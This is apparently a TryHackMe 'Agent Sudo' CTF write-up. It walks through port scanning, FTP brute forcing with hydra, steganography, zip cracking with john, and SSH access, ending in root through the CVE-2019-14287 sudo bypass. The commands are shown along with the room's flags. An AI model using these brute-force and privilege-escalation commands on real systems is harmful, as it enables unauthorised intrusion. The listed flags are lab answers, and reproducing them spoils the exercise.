# 🔴 AGENT SUDO - CTF WRITEUP

```
┌──(attacker㉿kali)-[~/agent-sudo]
└─$ echo "Starting infiltration..."
```

---

## 📡 RECONNAISSANCE

This room is packed with hands-on tools and challenges. Let's begin by scanning the target host to identify open ports.

### Port Scanning

```bash
nmap -A -T4 -p- 10.49.156.165
```

**Results:**
- **Port 21:** FTP
- **Port 22:** SSH  
- **Port 80:** HTTP

> **🚩 FLAG:** How many open ports? → **3**

---

## 🌐 WEB ENUMERATION

Accessing the HTTP service reveals a message from **Agent R**. The message hints that we need to use a **codename** as our User-Agent.

### User-Agent Manipulation

Since Agent R mentioned using codenames, let's cycle through the alphabet (A-Z) as User-Agent values.

```bash
curl -A "C" -L 10.49.156.165
```

**Response:** The page redirects and reveals the username: **chris**

> **🚩 FLAG:** How you redirect yourself to a secret page? → **user-agent**
>
> **🚩 FLAG:** What is the agent name? → **chris**

---

## 🔓 FTP BRUTE FORCE

Agent R mentioned that Chris's password is weak. Time to brute-force the FTP service.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 4 10.49.156.165 ftp
```

**Cracked Password:** `crystal`

> **🚩 FLAG:** FTP password? → **crystal**

---

## 📂 FTP FILE RETRIEVAL

Login to FTP and download all available files:

```bash
ftp 10.49.156.165
# Username: chris
# Password: crystal
get To_agentJ.txt
get cutie.png
get cute-alien.jpg
```

### Analyzing To_agentJ.txt

```bash
cat To_agentJ.txt
```

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real 
picture inside your directory. Your login password is somehow 
stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

**Key Intel:** Login password is hidden in a fake picture using **steganography**.

---

## 🖼️ STEGANOGRAPHY ANALYSIS

### Analyzing cutie.png

```bash
file cutie.png
strings cutie.png
```

Discovered an embedded file: `To_agentR.txt`

```bash
zsteg cutie.png
```

**Finding:** A ZIP file is embedded in the image!

### Extracting Embedded ZIP

```bash
foremost cutie.png
```

The extracted ZIP file requires a password. Time to crack it.

```bash
zip2john cutie.png > hash.txt
john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Cracked Password:** `alien`

> **🚩 FLAG:** Zip file password? → **alien**

### Extracting ZIP Contents

```bash
7z x 8702.zip
# Password: alien
cat To_agentR.txt
```

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

### Decoding Base64

```bash
echo "QXJlYTUx" | base64 -d
```

**Decoded:** `Area51`

> **🚩 FLAG:** steg password? → **Area51**

---

## 🛸 EXTRACTING FROM cute-alien.jpg

```bash
steghide extract -sf cute-alien.jpg
# Passphrase: Area51
cat message.txt
```

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set 
this password for you.

Your buddy,
chris
```

> **🚩 FLAG:** Who is the other agent (in full name)? → **james**
>
> **🚩 FLAG:** SSH password? → **hackerrules!**

---

## 🔑 SSH ACCESS

```bash
ssh james@10.49.156.165
# Password: hackerrules!
cat user.txt
```

> **🚩 FLAG:** What is the user flag? → **b03d975e8c92a7c04146cfa7a5a313c7**

---

## 🔍 REVERSE IMAGE SEARCH

Transfer the alien image to your local machine for analysis:

```bash
# On target machine
python3 -m http.server 8000

# On attacker machine
wget http://10.49.156.165:8000/Alien_autospy.jpg
```

Perform a reverse image search to identify the incident.

**Result:** Roswell alien autopsy

> **🚩 FLAG:** What is the incident of the photo called? → **Roswell alien autopsy**

---

## 🚀 PRIVILEGE ESCALATION

### Checking Sudo Privileges

```bash
sudo -l
```

**Output:**
```
(ALL, !root) /bin/bash
```

This configuration is vulnerable to **CVE-2019-14287**.

> **🚩 FLAG:** CVE number for the escalation? → **CVE-2019-14287**

### Exploiting the Vulnerability

```bash
sudo -u#-1 /bin/bash
```

**Result:** Root shell obtained!

### Capturing the Root Flag

```bash
cat /root/root.txt
```

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for 
TryHackMe. Tips, always update your machine.

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

> **🚩 FLAG:** What is the root flag? → **b53a02f55b57d4439e3341834d70c062**
>
> **🚩 BONUS FLAG:** Who is Agent R? → **DesKel**

---

## 📋 SUMMARY

```
┌─────────────────────────────────────────────────┐
│           EXPLOITATION CHAIN                    │
├─────────────────────────────────────────────────┤
│ 1. Nmap Scan      → Discovered FTP, SSH, HTTP   │
│ 2. User-Agent     → Found username: chris       │
│ 3. Hydra          → Cracked FTP: crystal        │
│ 4. Steganography  → Extracted hidden files      │
│ 5. John           → Cracked ZIP: alien          │
│ 6. Base64         → Decoded: Area51             │
│ 7. Steghide       → Retrieved SSH creds         │
│ 8. SSH            → User access as james        │
│ 9. CVE-2019-14287 → Root privilege escalation   │
│ 10. Root Flag     → Mission Complete!           │
└─────────────────────────────────────────────────┘
```
